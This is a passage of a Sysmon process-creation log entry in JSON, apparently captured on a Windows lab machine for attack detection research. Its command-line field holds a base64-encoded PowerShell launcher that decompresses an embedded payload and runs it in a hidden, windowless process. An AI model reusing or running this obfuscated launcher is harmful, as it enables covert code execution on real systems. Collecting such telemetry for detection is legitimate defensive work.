ABTAEUANABLAGQAOAA2AHIAUwBDADcAQgBqAFAAZwBWAEMAVQBVAEoAegBiAGQAUQBLAHYAaABoAFcAUAA3AHUAcgBwADAAeQBRAFQAMgBjAGkATQBMAGMAVQBuAGsARQBNAGoALwBRADQARgBFAGkANAB0AFMARAB2AEUASAB3AFEAMwBkAEwAUABJAHAAWgBoAGsAVgBGADYAbABLAGYANgBIAHUAWABCAHMAWABCADUAVwBlAFIATQBEAEIAagBjAEIAWABBADAAagAxAGsAQQBsAFkAeQBCAEYAeQBSAHMAUwBFAEcASAB5AEgAegBTAHQAVQBsAHcAZwBxADMAagBJAFEAZwBjAGIAagA3AEoAcwBNAEIAMwBQAFMAYwA3AGcAZgB5ADQASQBEADQANQBaADgAYwBMAFAAaAA4AEoARwArAEcAUgBRAEgAQwBFAC8AYwBnAHcAUwA3AGoAbwBpAEsATgBhAFMAeQBnAGgAbQBTADQASABuAGoAMABYADQANQAvAFUAagB5AE8AagBoAGcAeAB5AFYATQBoAEYAMQBkAGsAbwBlADkARgB4AHUAdABTADcATgBzAFoASgBYAE4AVQBEAGgAagBFAEEAdQBJADMAWQB4ADcAcQBPAEMARgB2AG0AcwBkAEMASQBiADkAUwBiADYAaQBEADQASgBsAFoARQBiAFAAOQA5AHgAdABhAHMAMwBiAHcAdABlAEUANwBzAGwAYwBYAGoAdABCADQAUwBCAHMAVwB0AHoAMABqAGMAVAByAG0AQgBhAEsANwBZAE8AZABkADkASgBIAG4AdgAvAGYASgBwAFQAdAB1AEMAcgBkAHQAQwBjAE4AQgAzAFEASABWADkATwBiAGEAMAA3AFUAaABqAEUAZQBXAG0ARgBtAFcAcwBEAHEAbwBPADEAeAA3AFQASABQAGEAWQBhADkAdgBKAFEALwBxAHIAagB2AEoAYgBCADEAdABlAE0AMQBtAGQANgBxAGgAUgBxAE4ANQAwADkAQQAyAEEATgB5AE0AMQBvAEkATgA4AHYAcwBoADMAVAAzADAAWQBBAHcAVgA4AGEAYQBuAFcANABtAHUAVwBhAHoAOQAzAHIAaQA5AG0AOQBUAE4AKwBZAFIAMQAxAGEAYQA1AFgAawAxADQANAByADYAWgB0AFYAUgBWAHYAZgBSAHgAeQA5ADQAagBwAEgATwAvAFkAZQArAG4AdABWAHMAKwA3AEgAcQBoADMAbwB5ADQAZQBtAGsAMABOADYAaQBOAGsAQgBHADEAeAA2AGIATwByADIAZAA2AGoAQgB4ADEAagBJAE0AdAAzADEAMABIAHUAbABFAFAARABJAFMARwBMAGkAWAB6AHcAYwBqAFUAQgB3AE4AVABSADYAUABPAHAAOAArAHQAUwB6AFYAUQBMAHkAZABUAHYATgBZAG4ANAB6AHEAZABiADYAZQAzAGEANQBpAGIAdQArADcAZwBXAHQAVwBhAGwAawArACsAOABQAGsATwBnAE8AdAB3AGgASQBOAGIAawBBAG0ATQB1AHIAZABlAGcAVQB6AHIATgBkAEoAZgA5ADMAbABTAHgAeAB1AGQASQB4ADEAawB6AFAAbABuADEARgBuAFAAdABxAGIARABZAEgAOAA0AHEAbgBNADAAWgB2ADAAcABSAHIAMwA1ADMAbABUAFYAMgBzAHgAcABvAHEANwBHAEoANQAwAEEARABVAEEAYwBCAC8AbwBBAG8AKwBTACsAOQBhAFcAbAAxAHMAWQArADkAeQBkAC8AOQBHAGMAcgBkAFQAeABsAGIAOQBXAFcATQBYAEQAVwAwAHkAeABtAGQAUgB0AG0AdgA3AHQAdQA2ADkAcQBiADEAMwBiAGUAegBkAHUATAAzAG8AUwBPAFEANAA1AEcAcQBqAHAAKwBsAFgARQBHAFMARgBQADYARQBqADUAaAB3AGsAdAAxADMATQBaAHgAcwBzAFkATQBHAEEASQBGAHUAcgBpAFcASgBvAC8ATgB2AE8AWQA2AG4ARwBZAGEAcwBwAHcAMQA2AGcAMgBKAEkAOABLAGcAegAwAEUAbgBMAEsAaQBOAEcATwBOAGUAVgB2AEcAUAB4AFIAbgBhAHoAYgBFAEoAWgBEADEAcABCAE0ATgBHAC8AZABtAFIASQBqADAASwBLAHQAOQBiAFEAYgBGADAAZABUAFUASABMACsARwB5AEEASgAyAHIAUABSAEkARgBZAGwAMwBSAEgAaABxAGEAQgBtAFYAZABlADIAaABxAEUATwBLAHYAQgAyAGIAdwA3AFYANwBPAEwARgBXAHkAcgBnAEMAdwA1AEgAYgBaAHcAYQA2AFMAWABaADgAUwBzADEAZgAvAEsAMQBqADUAbABWADMARABuAC8AKwB2AFkASAAxAGYAKwA0AGYAZABYAHcASgBRAHEAMgBUAGgALwByAFQANAA0ADgASgB2AGcAZgBtADcAZwBVADgAdwBGAFMARABvAFEAcwBsAGgANQBOAGoAegBYAG8AZwAvADUAOABXAFQAOQB3AEoASQBDAG0AUgA5AGwAVAAvAFoAZQA5ADEATgBLAHMANwA3ADgATABaAHcAZAB2AG8AMwBGAEsAVwBJAFMAMABFAEsAQQBBAEEAPQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA=","ParentImage":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessGuid":"747F3D96-308A-6095-CE04-000000001D00","ParentProcessId":5876,"ProcessGuid":"747F3D96-308D-6095-D004-000000001D00","ProcessId":2552,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:20:29.536"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1513,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:29.539449Z"}},"Version":5}}
